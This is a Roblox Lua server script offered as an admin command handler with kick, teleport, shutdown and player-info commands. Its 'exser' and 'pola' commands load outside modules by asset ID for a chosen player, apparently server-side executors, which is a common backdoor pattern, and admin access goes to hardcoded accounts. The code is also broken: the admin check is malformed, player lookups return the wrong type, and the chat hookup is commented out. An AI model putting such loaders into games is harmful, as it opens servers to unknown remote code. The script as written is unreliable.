-- Roblox Command Handler System (Admin-Only Version) - FIXED WITH ENHANCED RESET
-- Place this in ServerScriptService

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")

-- Configuration
_G.COMMAND_PREFIX = "-"  -- Change this to whatever prefix you want
local ADMIN_ONLY = true     -- All commands are admin-only by default now

-- Command Handler Class
local CommandHandler = {}
CommandHandler.__index = CommandHandler

function CommandHandler.new()
    local self = setmetatable({}, CommandHandler)
    self.commands = {}
    self.aliases = {}
    return self
end

-- Universal player finder function
function CommandHandler:findPlayer(query, executor)
    if not query or query == "" then
        return nil
    end

    local query_lower = query:lower()
    local players = Players:GetPlayers()
    local found = {}

    -- Special cases
    if query_lower == "me" or query_lower == "self" then
        return {executor}
    end

    if query_lower == "others" then
        for _, plr in ipairs(players) do
            if plr ~= executor then
                table.insert(found, plr)
            end
        end
        return found
    end

    if query_lower == "all" then
        return players
    end

    -- Exact name or display name match
    for _, plr in ipairs(players) do
        if plr.Name:lower() == query_lower or plr.DisplayName:lower() == query_lower then
            return {plr}
        end
    end

    -- Partial match (name first, then display name)
    for _, plr in ipairs(players) do
        if plr.Name:lower():find(query_lower, 1, true) then
            table.insert(found, plr)
        end
    end

    for _, plr in ipairs(players) do
        if plr.DisplayName:lower():find(query_lower, 1, true) and not table.find(found, plr) then
            table.insert(found, plr)
        end
    end

    return #found > 0 and found or nil
end


-- Register a new command (now defaults to admin-only)
function CommandHandler:registerCommand(name, callback, description, adminOnly, aliases)
    -- Default to admin-only if not specified
    if adminOnly == nil then
        adminOnly = true
    end
    
    self.commands[name:lower()] = {
        callback = callback,
        description = description or "No description available",
        adminOnly = adminOnly,
        name = name
    }
    
    -- Register aliases if provided
    if aliases then
        for _, alias in ipairs(aliases) do
            self.aliases[alias:lower()] = name:lower()
        end
    end
    
    local adminStatus = adminOnly and " (Admin Only)" or ""
    print("Command registered: " .. _G.COMMAND_PREFIX .. name .. adminStatus)
end

-- Check if player is admin (you can modify this logic)
function CommandHandler:isAdmin(player)
    -- Example admin check - modify as needed
    local adminIds = {2482664195, 8254790774, 3421321085, 7048410231, 7010691806} -- Replace with actual user IDs
    
    for _, id in ipairs(adminIds) do
        if player.UserId == id then
            return true
        end
    end
    
    return player.Name == "Dawninja21alt" and "idonthacklol101ns" -- Replace with your username
end

function CommandHandler:sendMessage(player, message)
    -- Use StarterPlayerGui for better compatibility
    local gui = player:FindFirstChild("PlayerGui")
    if not gui then
        warn("PlayerGui not found for " .. player.Name)
        return
    end
    
    -- Create a simple notification
    local screenGui = gui:FindFirstChild("CommandNotifications")
    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "CommandNotifications"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = gui
    end
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0, 400, 0, 60)
    textLabel.Position = UDim2.new(1, -420, 0, 20 + (#screenGui:GetChildren() * 70))
    textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.BackgroundTransparency = 0.2
    textLabel.BorderSizePixel = 0
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true
    textLabel.TextWrapped = true
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Text = message
    textLabel.Parent = screenGui
    
    -- Add corner rounding
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = textLabel
    
    -- Fade out animation
    local tween = game:GetService("TweenService"):Create(
        textLabel,
        TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
        {BackgroundTransparency = 1, TextTransparency = 1}
    )
    
    wait(2)
    tween:Play()
    tween.Completed:Connect(function()
        textLabel:Destroy()
    end)
end

-- Execute a command
function CommandHandler:executeCommand(player, commandName, args)
    local cmd = commandName:lower()
    
    -- Check if it's an alias
    if self.aliases[cmd] then
        cmd = self.aliases[cmd]
    end
    
    local command = self.commands[cmd]
    if not command then
        -- Only show error to admins to prevent spam
        if self:isAdmin(player) then
            self:sendMessage(player, "Unknown command: " .. commandName)
        end
        return
    end
    
    -- Check admin permissions
    if command.adminOnly and not self:isAdmin(player) then
        -- Silently ignore non-admin attempts to prevent spam
        return
    end
    
    -- Execute the command
    local success, errorMsg = pcall(command.callback, player, args)
    if not success then
        self:sendMessage(player, "Error executing command: " .. tostring(errorMsg))
        warn("Command error for " .. player.Name .. ": " .. tostring(errorMsg))
    end
end


--[[Parse command from chat message
function CommandHandler:parseCommand(message)
    -- Check if message starts with the command prefix
    if message:sub(1, #_G.COMMAND_PREFIX) ~= _G.COMMAND_PREFIX then
        return nil
    end
    
    local content = message:sub(#_G.COMMAND_PREFIX + 1)
    local parts = {}
    for part in content:gmatch("%S+") do
        table.insert(parts, part)
    end
    
    if #parts == 0 then
        return nil
    end
    
    local commandName = parts[1]
    local args = {}
    for i = 2, #parts do
        table.insert(args, parts[i])
    end
    
    return commandName, args
end]] -- no thanks dont check it

-- Get list of available commands for a player
function CommandHandler:getCommands(player)
    local availableCommands = {}
    for name, command in pairs(self.commands) do
        if not command.adminOnly or self:isAdmin(player) then
            table.insert(availableCommands, {
                name = _G.COMMAND_PREFIX .. command.name,
                description = command.description
            })
        end
    end
    return availableCommands
end

-- Initialize the command handler
local commandHandler = CommandHandler.new()

-- Handle respawning at saved position (for reset command)
local function setupPositionRestoration()
    Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(character)
            -- Check if player has a saved position
            local savedCFrameString = player:GetAttribute("SavedCFrame")
            if savedCFrameString then
                -- Wait for character to fully load
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 10)
                if humanoidRootPart then
                    -- Small delay to ensure character is stable
                    wait(0.1)
                    
                    -- Parse and restore the saved CFrame
                    local success, savedCFrame = pcall(function()
                        -- Convert string back to CFrame
                        local components = {}
                        for num in savedCFrameString:gmatch("([^,]+)") do
                            table.insert(components, tonumber(num:match("([%d%.%-]+)")))
                        end
                        
                        if #components >= 12 then
                            return CFrame.new(
                                components[1], components[2], components[3],
                                components[4], components[5], components[6],
                                components[7], components[8], components[9],
                                components[10], components[11], components[12]
                            )
                        else
                            -- Fallback to just position if full CFrame parsing fails
                            return CFrame.new(components[1] or 0, components[2] or 50, components[3] or 0)
                        end
                    end)
                    
                    if success and savedCFrame then
                        humanoidRootPart.CFrame = savedCFrame
                    end
                    
                    -- Clear the saved position
                    player:SetAttribute("SavedCFrame", nil)
                end
            end
        end)
    end)
    
    -- Also handle existing players (in case script is run while players are already in game)
    for _, existingPlayer in pairs(Players:GetPlayers()) do
        existingPlayer.CharacterAdded:Connect(function(character)
            -- Check if player has a saved position
            local savedCFrameString = existingPlayer:GetAttribute("SavedCFrame")
            if savedCFrameString then
                -- Wait for character to fully load
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 10)
                if humanoidRootPart then
                    -- Small delay to ensure character is stable
                    wait(0.1)
                    
                    -- Parse and restore the saved CFrame
                    local success, savedCFrame = pcall(function()
                        -- Convert string back to CFrame
                        local components = {}
                        for num in savedCFrameString:gmatch("([^,]+)") do
                            table.insert(components, tonumber(num:match("([%d%.%-]+)")))
                        end
                        
                        if #components >= 12 then
                            return CFrame.new(
                                components[1], components[2], components[3],
                                components[4], components[5], components[6],
                                components[7], components[8], components[9],
                                components[10], components[11], components[12]
                            )
                        else
                            -- Fallback to just position if full CFrame parsing fails
                            return CFrame.new(components[1] or 0, components[2] or 50, components[3] or 0)
                        end
                    end)
                    
                    if success and savedCFrame then
                        humanoidRootPart.CFrame = savedCFrame
                    end
                    
                    -- Clear the saved position
                    existingPlayer:SetAttribute("SavedCFrame", nil)
                end
            end
        end)
    end
end

-- Set up position restoration system
setupPositionRestoration()

-- Example Commands (All are now admin-only by default)

-- Help command (admin-only)
commandHandler:registerCommand("help", function(player, args)
    local commands = commandHandler:getCommands(player)
    local helpText = "Available Admin Commands:\n"
    for _, cmd in ipairs(commands) do
        helpText = helpText .. cmd.name .. " - " .. cmd.description .. "\n"
    end
    commandHandler:sendMessage(player, helpText)
end, "Shows available admin commands", true, {"h", "commands"})

-- Ping command (now admin-only)
commandHandler:registerCommand("ping", function(player, args)
    commandHandler:sendMessage(player, "Pong! Hello Admin " .. player.Name)
end, "Simple ping command for admins", true)

-- Shutdown Script (admin-only) - FIXED
commandHandler:registerCommand("shutdown", function(player, args)
    local reason = table.concat(args, " ")
    if reason == "" or reason == " " then
        reason = "Server maintenance"
    end
    
    -- Notify all players before kicking
    for _, v in pairs(Players:GetPlayers()) do
        commandHandler:sendMessage(v, "Server shutting down: " .. reason)
    end
    
    -- Wait a moment then kick all players
    wait(2)
    for _, v in pairs(Players:GetPlayers()) do
        v:Kick("[Dynamic.lua] Server shutdown: " .. reason)
    end
end, "Shuts down the server", true)

commandHandler:registerCommand("pola", function(player, args)
    local targetPlayer = player -- Default to the command user
    
    -- If a player name is provided, find that player
    if #args > 0 then
        local found = commandHandler:findPlayer(args[1])
        if found == "self" then
            targetPlayer = player
        elseif not found then
            commandHandler:sendMessage(player, "Player not found: " .. args[1])
            return
        else
            targetPlayer = found
        end
    end
    
    -- Load exser for the target player with error handling
    local success, err = pcall(function()
require(123255432303221):Pload("targetPlayer.Name")
    end)
    
    if success then
        if targetPlayer == player then
            commandHandler:sendMessage(player, "Loaded polaria for yourself")
        else
            commandHandler:sendMessage(player, "Loaded polaria for " .. targetPlayer.Name)
        end
    else
        commandHandler:sendMessage(player, "Failed to polaria exser: " .. tostring(err))
    end
end, "Loads polarira for yourself or specified player", true)

-- Exser command (FIXED)
commandHandler:registerCommand("exser", function(player, args)
    local targetPlayer = player -- Default to the command user
    
    -- If a player name is provided, find that player
    if #args > 0 then
        local found = commandHandler:findPlayer(args[1])
        if found == "self" then
            targetPlayer = player
        elseif not found then
            commandHandler:sendMessage(player, "Player not found: " .. args[1])
            return
        else
            targetPlayer = found
        end
    end
    
    -- Load exser for the target player with error handling
    local success, err = pcall(function()
        require(10868847330):pls(targetPlayer.Name)
    end)
    
    if success then
        if targetPlayer == player then
            commandHandler:sendMessage(player, "Loaded exser for yourself")
        else
            commandHandler:sendMessage(player, "Loaded exser for " .. targetPlayer.Name)
        end
    else
        commandHandler:sendMessage(player, "Failed to load exser: " .. tostring(err))
    end
end, "Loads exser for yourself or specified player", true)

-- Motorcycle command (FIXED)
commandHandler:registerCommand("moto", function(player, args)
      local targetPlayer = player -- Default to the command user
    
    -- If a player name is provided, find that player
    if #args > 0 then
        local found = commandHandler:findPlayer(args[1])
        if found == "self" then
            targetPlayer = player
        elseif not found then
            commandHandler:sendMessage(player, "Player not found: " .. args[1])
            return
        else
            targetPlayer = found
        end
    end
    
    -- Load moto for the target player with error handling
    local success, err = pcall(function()
        require(7473216460).load(targetPlayer.Name)
    end)
    
    if success then
        if targetPlayer == player then
            commandHandler:sendMessage(player, "Loaded moto for yourself")
        else
            commandHandler:sendMessage(player, "Loaded moto for " .. targetPlayer.Name)
        end
    else
        commandHandler:sendMessage(player, "Failed to load moto: " .. tostring(err))
    end
end, "Loads motorcycle for specified player", true)

-- Server info command (admin-only)
commandHandler:registerCommand("serverinfo", function(player, args)
    local info = "=== SERVER INFO ===\n"
    info = info .. "Players: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "\n"
    info = info .. "Place ID: " .. game.PlaceId .. "\n"
    info = info .. "Game ID: " .. game.GameId .. "\n"
    info = info .. "Creator: " .. game.CreatorType .. " ID " .. game.CreatorId
    commandHandler:sendMessage(player, info)
end, "Shows server information", true, {"server", "info"})

-- Kick command (admin-only) - ENHANCED
commandHandler:registerCommand("kick", function(player, args)
    if #args == 0 then
        commandHandler:sendMessage(player, "Usage: " .. _G.COMMAND_PREFIX .. "kick <player> [reason]")
        return
    end
    
    local targetPlayer = commandHandler:findPlayer(args[1])
    
    if not targetPlayer then
        commandHandler:sendMessage(player, "Player not found: " .. args[1])
        return
    end
    
    if targetPlayer == player then
        commandHandler:sendMessage(player, "You cannot kick yourself!")
        return
    end
    
    -- Check if target is also an admin
    if commandHandler:isAdmin(targetPlayer) then
        commandHandler:sendMessage(player, "Cannot kick another admin!")
        return
    end
    
    local reason = "Kicked by admin"
    if #args > 1 then
        table.remove(args, 1) -- Remove player name
        reason = table.concat(args, " ")
    end
    
    targetPlayer:Kick("You were kicked by " .. player.Name .. ". Reason: " .. reason)
    commandHandler:sendMessage(player, "Kicked " .. targetPlayer.Name .. " - Reason: " .. reason)
end, "Kicks a player from the server", true)

commandHandler:registerCommand("sprefix", function(player, args)
    if #args == 0 then
        commandHandler:sendMessage(player, "Usage: " .. _G.COMMAND_PREFIX .. "sprefix <new prefix>")
        return
    end

    _G.COMMAND_PREFIX = args[1]
    commandHandler:sendMessage(player, "Prefix changed to: " .. _G.COMMAND_PREFIX)
end, "changes your prefix i assume", true)

-- Teleport to player command (admin-only) - ENHANCED
commandHandler:registerCommand("tp", function(player, args)
    if #args == 0 then
        commandHandler:sendMessage(player, "Usage: " .. _G.COMMAND_PREFIX .. "tp <player>")
        return
    end
    
    local targetPlayer = commandHandler:findPlayer(args[1])
    
    if not targetPlayer then
        commandHandler:sendMessage(player, "Player not found: " .. args[1])
        return
    end
    
    if targetPlayer == player then
        commandHandler:sendMessage(player, "Cannot teleport to yourself!")
        return
    end
    
    if not player.Character or not targetPlayer.Character then
        commandHandler:sendMessage(player, "One or both characters not found!")
        return
    end
    
    local playerRoot = player.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    
    if not playerRoot or not targetRoot then
        commandHandler:sendMessage(player, "Cannot teleport - missing HumanoidRootPart!")
        return
    end
    
    -- Teleport with slight offset to avoid overlap
    playerRoot.CFrame = targetRoot.CFrame + Vector3.new(5, 0, 0)
    commandHandler:sendMessage(player, "Teleported to " .. targetPlayer.Name)
end, "Teleports you to another player", true, {"teleport", "goto"})

-- Get player info command (admin-only) - ENHANCED
commandHandler:registerCommand("whois", function(player, args)
    local targetPlayer = player -- Default to self if no argument
    
    if #args > 0 then
        local found = commandHandler:findPlayer(args[1])
        if found == "self" then
            targetPlayer = player
        elseif not found then
            commandHandler:sendMessage(player, "Player not found: " .. args[1])
            return
        else
            targetPlayer = found
        end
    end
    
    local info = "=== PLAYER INFO ===\n"
    info = info .. "Username: " .. targetPlayer.Name .. "\n"
    info = info .. "Display Name: " .. targetPlayer.DisplayName .. "\n"
    info = info .. "User ID: " .. targetPlayer.UserId .. "\n"
    info = info .. "Account Age: " .. targetPlayer.AccountAge .. " days\n"
    info = info .. "Admin Status: " .. (commandHandler:isAdmin(targetPlayer) and "Yes" or "No")
    
    commandHandler:sendMessage(player, info)
end, "Shows player information", true, {"info", "playerinfo"})

-- Bring player command (admin-only) - NEW
commandHandler:registerCommand("bring", function(player, args)
    if #args == 0 then
        commandHandler:sendMessage(player, "Usage: " .. _G.COMMAND_PREFIX .. "bring <player>")
        return
    end
    
    local targetPlayer = commandHandler:findPlayer(args[1])
    
    if not targetPlayer then
        commandHandler:sendMessage(player, "Player not found: " .. args[1])
        return
    end
    
    if targetPlayer == player then
        commandHandler:sendMessage(player, "Cannot bring yourself!")
        return
    end
    
    if not player.Character or not targetPlayer.Character then
        commandHandler:sendMessage(player, "One or both characters not found!")
        return
    end
    
    local playerRoot = player.Character:FindFirstChild("HumanoidRootPart")
    local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    
    if not playerRoot or not targetRoot then
        commandHandler:sendMessage(player, "Cannot bring - missing HumanoidRootPart!")
        return
    end
    
    -- Bring target to player with offset
    targetRoot.CFrame = playerRoot.CFrame + Vector3.new(-5, 0, 0)
    commandHandler:sendMessage(player, "Brought " .. targetPlayer.Name .. " to you")
end, "Brings a player to you", true)

-- Enhanced Reset character command that maintains position


--[[Connect chat handler
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        local commandName, args = commandHandler:parseCommand(message)
        if commandName then
            commandHandler:executeCommand(player, commandName, args)
        end
    end)
end)

-- Handle players already in the game
for _, player in pairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        local commandName, args = commandHandler:parseCommand(message)
        if commandName then
            commandHandler:executeCommand(player, commandName, args)
        end
    end)
end]] -- same with this aswell

print("Command Handler System loaded successfully!")
print("Type " .. _G.COMMAND_PREFIX .. "help for a list of available commands")
